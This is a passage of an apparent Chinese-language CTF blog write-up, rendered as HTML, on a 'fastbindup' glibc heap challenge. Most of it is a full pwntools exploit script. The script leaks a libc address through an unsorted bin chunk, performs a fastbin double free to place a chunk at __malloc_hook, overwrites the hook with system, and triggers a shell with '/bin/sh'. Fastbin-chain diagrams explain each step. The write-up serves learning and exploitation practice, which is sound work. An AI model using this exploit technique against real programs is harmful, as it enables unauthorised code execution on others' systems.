class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	chunk_str=r.recvline().strip()</span><br><span class="line">	<span class="keyword">return</span> chunk_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, payload</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fastbindup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x480</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#delete unsorted bin -&gt; fd,bk -&gt; libc address</span></span><br><span class="line">create(<span class="number">0x480</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(get(4)))</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ leak libc : &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ libc base : &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">mallochook_offset = <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + mallochook_offset - <span class="number">0x23</span></span><br><span class="line">libc_system = <span class="number">0x0000000000453a0</span> +  libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ MALLOC_HOOK : &#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak chunk 1</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">heap_chunk1 = u64(get(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ CHUNK 1 HEAP(/bin/sh chunk) : &#x27;</span>,<span class="built_in">hex</span>(heap_chunk1))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>現在fastbin chain </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 1 -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br></pre></td></tr></table></figure>
+<p>先malloc 1(ptr index 6)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br><span class="line">             ^</span><br><span class="line">    chunk 1 _|</span><br><span class="line">    </span><br><span class="line">chunk 1 (free &amp; allocated)</span><br><span class="line">chunk 2 (free)</span><br></pre></td></tr></table></figure>
+
+<p>把chunk 1 寫入 malloc_hook 位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 2 -&gt; chunk 1 -&gt; malloc_hook</span><br><span class="line">    </span><br><span class="line">chunk 1 (free &amp; allocated)</span><br><span class="line">chunk 2 (free)</span><br></pre></td></tr></table></figure>
+
+<p>現在<br>malloc三次，拿到了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk 2(ptr index 7)</span><br><span class="line">chunk 1(ptr index 8)</span><br><span class="line">malloc_hook(ptr index 9)</span><br></pre></td></tr></table></figure>
+
+<p>把chunk 1寫入<code>/bin/sh</code>,<code>/bin/sh</code>位置就會在<code>chunk 1 address + 0x10</code></p>
+<p>那malloc hook現在到底在哪裡?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header 0x10</span><br><span class="line">0x10</span><br><span class="line">0x3 malloc hook</span><br></pre></td></tr></table></figure>
+<p>所以你要先padding，<code>0x13</code>個a在寫掉malloc hook成system<br>最後傳入<code>/bin/sh</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(&quot;/bin/sh&quot;) -&gt; (*__malloc_hook)(&quot;/bin/sh&quot;) -&gt; system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="script"><a href="#script" class="headerlink" title="script"></a>script</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">	<span class="comment">#print(&quot;malloc size: &quot;, size)</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	<span class="comment">#print(r.recvline())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	chunk_str=r.recvline().strip()</span><br><span class="line">	<span class="keyword">return</span> chunk_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, payload</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fastbindup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x480</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#delete unsorted bin -&gt; fd,bk -&gt; libc address</span></span><br><span class="line">create(<span class="number">0x480</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(get(4)))</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ leak libc : &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ libc base : &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">mallochook_offset = <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + mallochook_offset - <span class="number">0x23</span></span><br><span class="line">libc_system = <span class="number">0x453a0</span> +  libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ MALLOC_HOOK : &#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak chunk 1</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">heap_chunk1 = u64(get(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ CHUNK 1 HEAP(/bin/sh chunk) : &#x27;</span>,<span class="built_in">hex</span>(heap_chunk1))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">r.sendline(p64(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ Write Chunk 1 : &#x27;</span>,<span class="built_in">hex</span>(u64(get(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment"># chunk 2(ptr index 7)</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment"># chunk 1(ptr index 8)</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment"># malloc_hook(ptr index 9)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(<span class="number">8</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_malloc_hook_payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(libc_system)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">r.sendline(write_malloc_hook_payload)</span><br><span class="line"></span><br><span class="line">create(heap_chunk1+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/07/07/Pwnable-orw/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
